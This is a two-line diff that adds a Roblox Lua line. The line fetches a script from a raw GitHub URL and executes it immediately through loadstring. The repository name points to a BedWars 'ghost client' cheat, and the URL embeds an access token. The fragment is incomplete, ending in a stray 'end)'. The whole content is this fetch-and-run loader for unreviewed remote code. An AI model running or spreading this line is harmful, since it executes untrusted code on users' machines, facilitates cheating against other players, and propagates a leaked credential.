@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GaixyReca/CammoV1GHostClientRobPrivateloxBedWars/main/Main?token=GHSAT0AAAAAACIT7HAS2LTAJKJI36TPK6ASZJKCMQQ",true))()
+end)
